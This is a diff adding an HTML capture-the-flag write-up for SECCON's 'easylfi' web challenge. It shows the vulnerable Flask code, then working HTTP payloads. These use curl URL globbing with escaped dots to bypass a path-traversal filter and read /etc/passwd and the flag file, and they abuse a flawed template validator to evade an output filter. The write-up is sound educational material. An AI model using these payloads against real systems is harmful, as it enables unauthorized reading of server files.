@@ -1,0 +1,453 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>easylfi</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - easylfi</h1>
+<p>We're given the following files.</p>
+<pre class="language-sh"><code class="language-sh">├── docker-compose.yml
+└── web
+	├── Dockerfile
+	├── app.py
+	├── flag.txt
+	├── public
+	│   ├── hello.html
+	│   └── index.html
+	└── requirements.txt
+
+<span class="token number">4</span> directories, <span class="token number">7</span> files</code></pre>
+<p>Looking at the <code>Dockerfile</code>, we see the flag is at <code>/flag.txt</code>.</p>
+<pre class="language-Dockerfile"><code class="language-Dockerfile">FROM python:3.10.8-bullseye
+
+WORKDIR /app
+
+COPY requirements.txt .
+RUN pip install -r requirements.txt
+
+COPY flag.txt /
+
+COPY public public
+COPY app.py .
+
+USER 404:404
+
+CMD ["flask", "run", "--host=0.0.0.0", "--port=3000"]</code></pre>
+<p>The <code>app.py</code> file is where the core of the challenge lives.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">import</span> os
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
+    <span class="token comment"># E.g. key == "{name}" -> True</span>
+    <span class="token comment">#      key == "name"   -> False</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    is_valid <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"{"</span>
+        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"}"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">!=</span> <span class="token string">"{"</span> <span class="token keyword">and</span> c <span class="token operator">!=</span> <span class="token string">"}"</span>
+    <span class="token keyword">return</span> is_valid
+
+
+<span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> params<span class="token punctuation">:</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    <span class="token comment"># A very simple template engine</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> params<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> validate<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid key: </span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+        text <span class="token operator">=</span> text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> text
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
+<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>response<span class="token punctuation">:</span> Response<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">b"SECCON"</span> <span class="token keyword">in</span> <span class="token string">b""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>response<span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> Response<span class="token punctuation">(</span><span class="token string">"Try harder"</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> response
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/&lt;path:filename>"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>filename<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token string">".."</span> <span class="token keyword">in</span> filename <span class="token keyword">or</span> <span class="token string">"%"</span> <span class="token keyword">in</span> filename<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Do not try path traversal :("</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        proc <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>
+            <span class="token punctuation">[</span><span class="token string">"curl"</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"file://</span><span class="token interpolation"><span class="token punctuation">{</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">/public/</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+            capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>
+            timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>
+        <span class="token punctuation">)</span>
+    <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Timeout"</span>
+
+    <span class="token keyword">if</span> proc<span class="token punctuation">.</span>returncode <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"Something wrong..."</span>
+    <span class="token keyword">return</span> template<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">)</span></code></pre>
+<p>Reading through this code, we get the following key information:</p>
+<ol>
+<li>A request to <code>/example.html</code> will:
+<ul>
+<li>Check that our path (<code>example.html</code> in this case, we'll refer to this as <code>&lt;input&gt;</code>) does not contain <code>..</code> or <code>%</code>.</li>
+<li>Execute <code>curl</code> on the command line, where we control <code>&lt;input&gt;</code> in <code>curl file:///app/public/&lt;input&gt;</code>.</li>
+<li>Retrieve the <code>stdout</code> of the command and perform a find/replace depending on query parameters we supply. E.g. if we provide <code>/&lt;input&gt;?{name}=test</code>, then any occurance of <code>{name}</code> will be replaced with <code>test</code>. Note that the <code>validate()</code> function makes sure the <code>key</code> (the <code>{name}</code> part) starts and ends with <code>{</code> and <code>}</code> respectively. It also ensures the <code>key</code> doesn't have any nested curly brackets.</li>
+<li>Return the processed <code>stdout</code> of the command in the HTTP response.</li>
+</ul>
+</li>
+<li>Before returning a response, the web server will check that it does not contain the <code>SECCON</code> string. This will be a problem, because the flag format is something like <code>SECCON{.*}</code>.</li>
+</ol>
+<p>The following excerpts show the templating behaviour using the <code>public/hello.html</code> file.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/hello.html?{name}=apender</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+&lt;!DOCTYPE html>
+&lt;html>
+&lt;head>
+  &lt;meta charset="UTF-8">
+  &lt;title>easylfi&lt;/title>
+&lt;/head>
+&lt;body>
+  &lt;h1>Hello, apender!&lt;/h1>
+&lt;/body>
+&lt;/html></code></pre>
+<p>The below excerpt shows the original content of <code>public/hello.html</code>.</p>
+<pre class="language-html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>easylfi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello, {name}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+<p>Seems pretty straight forward, but we clearly have two problems to solve before we can get the flag.</p>
+<ol>
+<li>How do we read arbitrary files? At some point, we need to read <code>/flag.txt</code>.</li>
+<li>How do we remove <code>SECCON</code> from the response when we try to read the flag?</li>
+</ol>
+<p>Lets start with the first issue. Since we're in a cURL command, I figured there may be some cURL functionality we could use to get around the <code>..</code> and <code>%</code> pattern filters. Looking into the cURL documentation, we find <a href="https://github.com/curl/curl/blob/master/docs/cmdline-opts/_GLOBBING.md">globbing</a>:</p>
+<blockquote>
+<p>You can specify multiple URLs or parts of URLs by writing lists within braces or ranges within brackets. We call this &quot;globbing&quot;. ... <code>https://example.com/archive[1996-1999]/vol[1-4]/part{a,b,c}.html</code></p>
+</blockquote>
+<p>This seemed like it could be useful, so I quickly checked whether it would work in the challenge set up.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/hello.htm{a,l}?{name}=apender</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/hello.htma</span></span>
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/hello.html</span></span>
+&lt;!DOCTYPE html>
+&lt;html>
+&lt;head>
+  &lt;meta charset="UTF-8">
+  &lt;title>easylfi&lt;/title>
+&lt;/head>
+&lt;body>
+  &lt;h1>Hello, apender!&lt;/h1>
+&lt;/body>
+&lt;/html></code></pre>
+<p>Looks good! We even get a little bit more user-controlled content in the response. After confirming that this worked, I started tinkering with the globbing to see if we could smuggle in a path traversal without the literal <code>..</code> pattern. Pretty quickly, I found that backslashes <code>\</code> would be ignored entirely within a glob. We can leverage this to bypass the pattern check as below.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{\.\.%2f\.\.%2fetc%2fpasswd}</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">root</span><span class="token punctuation">:</span><span class="token header-value">x:0:0:root:/root:/bin/bash</span></span>
+<span class="token header"><span class="token header-name keyword">daemon</span><span class="token punctuation">:</span><span class="token header-value">x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
+<span class="token header"><span class="token header-name keyword">bin</span><span class="token punctuation">:</span><span class="token header-value">x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
+...snip...</code></pre>
+<p>I looked into the cURL source code, and found that this behaviour is likely caused by the following lines:</p>
+<ul>
+<li><a href="https://github.com/curl/curl/blob/52ac8104e1396998110e0760ac780f4f2414831f/src/tool_urlglob.c#L175">/src/tool_urlglob.c L175 | cURL</a></li>
+<li><a href="https://github.com/curl/curl/blob/52ac8104e1396998110e0760ac780f4f2414831f/src/tool_urlglob.c#L442">/src/tool_urlglob.c L442 | cURL</a></li>
+</ul>
+<p>The following excerpt shows a snippet from one of the above links where the backslashes are explicitly ignored even if the escaped character isn't a known special character in the glob syntax.</p>
+<pre class="language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token char">'\\'</span><span class="token operator">:</span>                          <span class="token comment">/* escaped character, skip '\' */</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>pattern<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token operator">++</span>pattern<span class="token punctuation">;</span>
+    <span class="token operator">++</span><span class="token punctuation">(</span><span class="token operator">*</span>posp<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token function">FALLTHROUGH</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Anyway, we now have arbitrary file read, but we can't just read the flag because of the <code>SECCON</code> string check.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{\.\.%2f\.\.%2fflag.txt}</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+Try harder</code></pre>
+<p>At this point, I patched the application to just change the return status code to <code>201</code> if the <code>SECCON</code> string is detected. This way we're not entirely blind while trying to figure out a bypass. The response to a <code>/flag.txt</code> read attempt now looks like the below.</p>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">201</span> <span class="token reason-phrase string">CREATED</span></span>
+...snip...
+SECCON{dummydummy}</code></pre>
+<p>From here I figured that the idea would be to use the templating functionality to somehow remove or malform the <code>SECCON</code> part of the flag, so we'll take a closer look at the code used for the templating.</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
+    <span class="token comment"># E.g. key == "{name}" -> True</span>
+    <span class="token comment">#      key == "name"   -> False</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    is_valid <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"{"</span>
+        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"}"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">!=</span> <span class="token string">"{"</span> <span class="token keyword">and</span> c <span class="token operator">!=</span> <span class="token string">"}"</span>
+    <span class="token keyword">return</span> is_valid
+
+
+<span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> params<span class="token punctuation">:</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>
+    <span class="token comment"># A very simple template engine</span>
+    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> params<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token keyword">not</span> validate<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Invalid key: </span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">"</span></span>
+        text <span class="token operator">=</span> text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> text
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>snip<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/&lt;path:filename>"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>filename<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"index.html"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>snip<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    <span class="token keyword">return</span> template<span class="token punctuation">(</span>proc<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>args<span class="token punctuation">)</span></code></pre>
+<p>After finding the arbitrary file read so quickly I got stuck here for a while. The logic in <code>validate()</code> seemed pretty good at making sure that the <code>key</code>s we submitted began and ended with curly braces, and that it didn't contain nested curly braces. A little rabbit hole I went down here was looking into whether I could get Flask to accept arrays or objects through query parameters just to see how the <code>validate()</code> function would handle it, but this didn't work. After staring at the logic for a bit longer I finally realised that the lines marked below introduced a bug:</p>
+<pre class="language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">validate</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
+    <span class="token comment"># E.g. key == "{name}" -> True</span>
+    <span class="token comment">#      key == "name"   -> False</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+    is_valid <span class="token operator">=</span> <span class="token boolean">True</span>
+    <span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                  <span class="token comment">#1</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"{"</span>
+        <span class="token keyword">elif</span> i <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>     <span class="token comment">#2</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">==</span> <span class="token string">"}"</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>                       <span class="token comment">#3</span>
+            is_valid <span class="token operator">&amp;</span><span class="token operator">=</span> c <span class="token operator">!=</span> <span class="token string">"{"</span> <span class="token keyword">and</span> c <span class="token operator">!=</span> <span class="token string">"}"</span>
+    <span class="token keyword">return</span> is_valid
+</code></pre>
+<p>Notice that the validation logic will always check whether the first character is <code>{</code> (this happens at <code>#1</code>). All the other validation logic (<code>#2</code> and <code>#3</code>) will only happen if the currently checked character is NOT the first character! This means that a single <code>{</code> character is a valid <code>key</code>!</p>
+<p>An immediate idea is to flip the first <code>{</code> bracket of the flag to <code>}</code>, making it much more possible for us to wrap the <code>SECCON</code> string in curly braces and replace it.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{\.\.%2f\.\.%2fflag.txt}?{=}</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">201</span> <span class="token reason-phrase string">CREATED</span></span>
+...snip...
+SECCON}dummydummy}</code></pre>
+<p>But now we need to somehow control some content before <code>SECCON</code>, so that we can add an opening curly brace (<code>{</code>) to make it valid for replacement. Luckily we have this trick from earlier.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{garb,\.\.%2f\.\.%2fflag.txt}?{=}</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">201</span> <span class="token reason-phrase string">CREATED</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/garb</span></span>
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/../../flag.txt</span></span>
+SECCON}dummydummy}</code></pre>
+<p>Exploring this further, I found that you can provide query parameters to the <code>file://</code> scheme, and they'll be reflected in the additional content.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{garb,\.\.%2f\.\.%2fflag.txt%3fexample=test}?{=}</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">201</span> <span class="token reason-phrase string">CREATED</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/garb</span></span>
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/../../flag.txt?example=test</span></span>
+SECCON}dummydummy}</code></pre>
+<p>We now have what we need to wrap the <code>SECCON</code> string in curly braces!</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{garb,\.\.%2f\.\.%2fflag.txt%3f\%7b}?{=}{</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Reponse</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">201</span> <span class="token reason-phrase string">CREATED</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/garb</span></span>
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/../../flag.txt?}{</span></span>
+SECCON}{dummydummy}</code></pre>
+<p>Note that in addition to our <code>/flag.txt?\{</code> payload, we also changed our <code>{=}</code> to <code>{=}{</code>, otherwise the <code>{</code> we added would just get flipped back to <code>}</code> by our replacement.</p>
+<p>With this, we can add in a final replacement query parameter that replaces the <code>SECCON</code> string. I'll remove our custom patches for this last part, so the challenge is now functioning exactly as it would normally.</p>
+<h4>Request</h4>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/{garb,\.\.%2f\.\.%2fflag.txt%3f\%7b}?{=}{&amp;{%0aSECCON}=replaced</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<h4>Response</h4>
+<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
+...snip...
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/garb</span></span>
+<span class="token header"><span class="token header-name keyword">--_curl_--file</span><span class="token punctuation">:</span><span class="token header-value">///app/public/../../flag.txt?}replaced{dummydummy}</span></span></code></pre>
+<p>There it is! We bypassed the <code>SECCON</code> string check and got our flag!</p>
+
+		</div>
+	</div>
+  </body>
+
+
+	<style>
+		/**
+		 * Gruvbox dark theme
+		 *
